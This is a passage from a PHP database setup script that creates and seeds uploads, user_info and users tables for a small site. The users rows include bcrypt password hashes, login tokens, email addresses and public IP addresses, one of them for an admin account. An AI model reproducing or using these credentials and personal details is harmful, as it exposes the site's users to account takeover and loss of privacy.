 (new Query('INSERT INTO  `#{uploads}` VALUES (\'34\',\'48\',\'index.php\',\'\',\'1476201102\',\'1\',\'1\'),(\'36\',\'43\',\'favicon.ico\',\'\',\'1476201798\',\'3\',\'1\'),(\'38\',\'43\',\'.htaccess\',\'\',\'1476202561\',\'5\',\'1\'),(\'39\',\'43\',\'avatar.svg\',\'\',\'1476262714\',\'8\',\'1\'),(\'40\',\'43\',\'mccn.gif\',\'\',\'1476263880\',\'9\',\'1\'),(\'41\',\'43\',\'user_anonymous.svg\',\'\',\'1476264445\',\'11\',\'1\'),(\'42\',\'43\',\'jxol.svg\',\'\',\'1476264471\',\'12\',\'1\'),(\'43\',\'43\',\'15.jpg\',\'\',\'1476264539\',\'13\',\'1\'),(\'44\',\'48\',\'b1b84d8cca03cbbe903c5c41c8379798.jpg\',\'\',\'1476264801\',\'14\',\'1\'),(\'45\',\'48\',\'03.jpg\',\'\',\'1476264861\',\'15\',\'1\'),(\'46\',\'48\',\'ATDColor.png\',\'\',\'1476264867\',\'16\',\'1\'),(\'47\',\'48\',\'logo2.1.png\',\'\',\'1476265793\',\'17\',\'1\'),(\'48\',\'48\',\'100.png\',\'\',\'1476268017\',\'18\',\'1\'),(\'49\',\'47\',\'c2cec3fdfc03924585e5aeff8794a4c27c1e25e9.jpg\',\'\',\'1476429370\',\'19\',\'1\'),(\'50\',\'0\',\'login_by_cookie.png\',\'\',\'1476432608\',\'20\',\'1\'),(\'51\',\'0\',\'edit_with_markdown.png\',\'\',\'1476432608\',\'21\',\'1\'),(\'52\',\'0\',\'nothing.png\',\'\',\'1476432608\',\'22\',\'1\'),(\'53\',\'0\',\'my_script.png\',\'\',\'1476432608\',\'23\',\'1\'),(\'54\',\'0\',\'cookies.png\',\'\',\'1476432608\',\'24\',\'1\'),(\'55\',\'0\',\'xss_def.png\',\'\',\'1476432608\',\'25\',\'1\'),(\'56\',\'0\',\'cookie_with_js.png\',\'\',\'1476432608\',\'26\',\'1\'),(\'57\',\'0\',\'one_cookie.png\',\'\',\'1476432608\',\'27\',\'1\'),(\'58\',\'0\',\'one_cookie_get.png\',\'\',\'1476432608\',\'28\',\'1\'),(\'59\',\'0\',\'set_cookie.png\',\'\',\'1476432609\',\'29\',\'1\'),(\'60\',\'0\',\'a_girl.png\',\'\',\'1476432609\',\'30\',\'1\'),(\'61\',\'0\',\'chance_for_you.png\',\'\',\'1476432609\',\'31\',\'1\'),(\'62\',\'0\',\'baidu_jgylogo3.gif\',\'\',\'1476436563\',\'141\',\'1\'),(\'63\',\'0\',\'safe.zip\',\'\',\'1476437985\',\'308\',\'1\'),(\'64\',\'47\',\'before.png\',\'png\',\'1476589368\',\'1275\',\'1\'),(\'65\',\'47\',\'after.png\',\'png\',\'1476589413\',\'1276\',\'1\'),(\'66\',\'47\',\'670337693A4312F29ADB5E8F312CEC59422CB758D\',\'jpg\',\'1476589569\',\'1277\',\'1\'),(\'67\',\'0\',\'mix-xss\',\'zip\',\'1476592193\',\'1278\',\'0\'),(\'68\',\'0\',\'mix-xss\',\'zip\',\'1476592413\',\'1282\',\'0\'),(\'69\',\'0\',\'mix-xss\',\'zip\',\'1476592949\',\'1378\',\'0\'),(\'70\',\'0\',\'mix-xss\',\'zip\',\'1476595822\',\'1392\',\'0\'),(\'71\',\'0\',\'mix-xss\',\'zip\',\'1476596042\',\'1406\',\'0\'),(\'72\',\'0\',\'mix-xss\',\'zip\',\'1476596429\',\'1420\',\'0\'),(\'73\',\'43\',\'6072d71586fc0468f0d04a27549a8678\',\'jpg\',\'1476598153\',\'1434\',\'1\')'))->exec();

 (new Query('DROP TABLE IF EXISTS #{user_info}'))->exec();

 (new Query('CREATE TABLE `#{user_info}` (
  `uid` bigint(20) NOT NULL,
  `avatar` bigint(20) NOT NULL COMMENT \'头像文件ID\',
  `qq` varchar(20) DEFAULT NULL,
  `discription` tinytext NOT NULL,
  `phone` varchar(11) DEFAULT NULL,
  PRIMARY KEY (`uid`),
  KEY `avatar` (`avatar`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT=\'用户信息\''))->exec();

 (new Query('INSERT INTO  `#{user_info}` VALUES (\'43\',\'73\',\'\',\'学无领域，一学到底。\',\'\'),(\'46\',\'43\',\'\',\'hhahhahh\',\'\'),(\'47\',\'66\',\'\',\'hhahhahh\',\'\'),(\'48\',\'48\',\'\',\'学无领域，一学到底。\',\'\'),(\'49\',\'43\',\'\',\'hhahhahh\',\'\')'))->exec();

 (new Query('DROP TABLE IF EXISTS #{users}'))->exec();

 (new Query('CREATE TABLE `#{users}` (
  `uid` bigint(20) NOT NULL AUTO_INCREMENT,
  `uname` varchar(12) NOT NULL,
  `upass` varchar(60) NOT NULL,
  `gid` int(11) NOT NULL DEFAULT \'3\',
  `signup` int(11) NOT NULL,
  `signin` int(11) NOT NULL,
  `email` varchar(50) NOT NULL,
  `email_verify` enum(\'Y\',\'N\') NOT NULL DEFAULT \'N\',
  `lastip` varchar(32) NOT NULL,
  `token` varchar(32) NOT NULL COMMENT \'登陆验证值\',
  `status` int(11) NOT NULL DEFAULT \'0\' COMMENT \'状态\',
  PRIMARY KEY (`uid`),
  UNIQUE KEY `uid` (`uid`),
  UNIQUE KEY `uname` (`uname`),
  KEY `uid_2` (`uid`),
  KEY `uid_3` (`uid`),
  KEY `uid_4` (`uid`)
) ENGINE=MyISAM AUTO_INCREMENT=51 DEFAULT CHARSET=utf8'))->exec();

 (new Query('INSERT INTO  `#{users}` VALUES (\'47\',\'dddd\',\'$2y$10$wBPNnCrRl9272PSeMZyjOOo5x81XAB/RmOk9neWb7V1xd7Pz/bfBu\',\'2\',\'1475723206\',\'1476354661\',\'dddd@q.c\',\'N\',\'127.0.0.1\',\'\',\'0\'),(\'46\',\'ddddd\',\'$2y$10$GvYQQAlFjC175csViVoS9eGkZ9JdxTTrDdnTZ6DzPQkxQB8K5.RR6\',\'3\',\'1475722991\',\'1476609643\',\'d@d.c\',\'N\',\'127.0.0.1\',\'09860b929e324c8f0801d88f357db1c8\',\'0\'),(\'44\',\'admin\',\'$2y$10$e0R6lH7pS2Og6DhRqpcaZ.ex.5WWZM0yGieCg/Y9CJT4pJMNCRAcW\',\'3\',\'1475669954\',\'0\',\'admin@atd3.cn\',\'N\',\'127.0.0.1\',\'4f992374c5dc8e7ec07e514539f47ea3\',\'0\'),(\'48\',\'dxkite\',\'$2y$10$YWbzIa.kyMGGHjLW5M1RAulf3dp8g3QVIVS.F8MS9rylHyBeaBgkq\',\'1\',\'1475722991\',\'1476595810\',\'dxkite@atd3.cn\',\'N\',\'127.0.0.1\',\'\',\'0\'),(\'43\',\'hello\',\'$2y$10$Ld4pc3sUM3lT4fr1UPwQt.VlTcQkBA0kB/1eHdH.1ReDiFwjwO9bu\',\'2\',\'1475652025\',\'1476598122\',\'helloworld@atd3.cn\',\'Y\',\'113.246.217.148\',\'7c5c229075ffa9dd26ee6b0e80069ddb\',\'0\'),(\'49\',\'Xinyonghu\',\'$2y$10$EK0VfXbl5SSFndOpfY2iu.9lhWC1rSCx.n24hyCzIfmRJKgpmjleK\',\'3\',\'1476584435\',\'0\',\'Xinyonghu@163.com\',\'N\',\'27.17.206.130\',\'e83b575b5d4561f2edad5da88f21fb6c\',\'0\'),(\'50\',\'heidan\',\'$2y$10$fyyCZTiQPl.I3uxMD.gi0OFq.qFiE3Mue5xPA4wVxrGSRsRP19ktK\',\'3\',\'1476587388\',\'0\',\'2877617866@qq.com\',\'N\',\'220.202.153.35\',\'2d04c210def33023f465119ab017cf9c\',\'0\')'))->exec();

/** End Querys **/
Query::commit();
return true;
} 
catch (Exception $e)
{
    Query::rollBack();
   return false;
}